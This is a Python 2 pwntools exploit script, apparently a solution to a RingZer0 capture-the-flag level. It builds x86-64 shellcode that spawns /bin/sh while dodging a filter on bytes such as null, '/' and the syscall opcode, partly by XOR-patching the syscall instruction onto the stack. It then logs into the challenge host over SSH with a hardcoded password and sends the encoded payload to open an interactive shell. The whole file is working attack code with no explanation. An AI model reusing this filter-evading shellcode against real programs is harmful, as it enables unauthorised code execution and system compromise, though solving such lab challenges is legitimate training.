#!/usr/bin/env python2
from pwn import *
context(arch = 'amd64', os = 'linux')

def escape_encode(s):
    ret = ''
    for c in s:
        ret += '\\x%02x' % ord(c)
    return ret

def limit(s):
    if len(s) > 80:
        return False
    for c in s:
        if c == '\x00':
            return False
        if c == '\x0a':
            return False
        if c == '\x0d':
            return False
        if c == '\x2e':
            return False
        if c == '\x2f':
            return False
        if c == '\xff':
            return False
        if c == '\x0f':
            return False
        if c == '\x05':
            return False
        if c == '\x48':
            return False
    return True

shellcode =  asm('push 0x%08x' % (unpack('/bin', 32) + 0x08080808))
shellcode += asm('sub dword ptr[rsp], 0x08080808')
shellcode += asm('mov eax, 0x%08x' % (unpack('/sh\x00', 32) + 0x08080808))
shellcode += asm('sub eax, 0x08080808')
shellcode += asm('mov dword ptr[rsp + 4], eax')     # push "/bin/sh\x00"
shellcode += asm('push SYS_execve')
shellcode += asm('pop rax')                         # rax = SYS_execve
shellcode += asm('push 1')
shellcode += asm('pop rsi')
shellcode += asm('xor sil, 1')                      # rsi = 0
shellcode += asm('push rsi')
shellcode += asm('pop rdx')                         # rdx = 0
shellcode += asm('push rsp')
shellcode += asm('pop rdi')                         # rdi = rsp
shellcode += asm('push 0x%08x' % (unpack('\x0f\x05\x00\x00', 32) ^ 0x77777777))
shellcode += asm('mov ecx, 0x77777777')
shellcode += asm('xor dword ptr[rsp], ecx')         # push syscall
shellcode += asm('push rsp')
shellcode += asm('ret')                             # rip = rsp

if limit(shellcode) == False:
    print('limit failed!')
    exit(0)

conn = ssh(user = 'level4', 
           host = 'challenges.ringzer0team.com', 
           password = 'FLAG-GSqrWoJEFRCbfNKUMNiTs3sYiM', 
           port = 10127)
shell = conn.shell()
shell.sendline(escape_encode(shellcode))
shell.interactive()
